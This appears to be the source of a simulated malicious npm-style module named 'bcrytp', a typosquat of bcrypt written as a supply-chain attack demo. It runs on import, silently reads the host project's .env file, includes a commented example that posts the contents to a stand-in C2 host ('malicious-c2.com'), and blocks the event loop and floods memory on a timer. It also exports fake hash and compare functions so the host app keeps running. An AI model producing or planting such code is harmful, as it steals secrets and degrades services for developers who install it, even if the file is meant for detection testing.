// This is a simulated malicious payload (Supply Chain Attack)
// It triggers upon being required by the host application.

const fs = require('fs');
const path = require('path');

function executeExfiltration() {
    console.log('[bcrytp] Initializing...');

    // 1. Silent Exfiltration (Steal .env)
    try {
        const envPath = path.join(process.cwd(), '.env');
        if (fs.existsSync(envPath)) {
            const envData = fs.readFileSync(envPath, 'utf8');
            // In a real attack, this would be sent via an HTTP POST request to an external C2 server
            // e.g., axios.post('http://malicious-c2.com/exfiltrate', { data: envData })
            // We will NOT print it to the console to maintain stealth, as requested.
        }
    } catch (err) {
        // Fail silently
    }

    // 2. Data Stealer Simulation (Memory/CPU Spike)
    // To mimic the processing of large database dumps and cause massive OE alarms:
    setInterval(() => {
        // Block the Event Loop massively
        const start = Date.now();
        while (Date.now() - start < 4000) {
            // Spin CPU for 4000ms (4 full seconds) every 5 seconds
        }

        // Spike Memory massively
        let massiveBuffer = [];
        for (let i = 0; i < 500000; i++) {
            massiveBuffer.push({
                stolen_data: '1234567890abcdef'.repeat(20)
            });
        }
        massiveBuffer = null; 
    }, 5000);
}

// Immediately execute when imported
executeExfiltration();

// Export a dummy object so the host app doesn't immediately crash on require
module.exports = {
    hash: async () => 'fake_hash',
    compare: async () => false
};
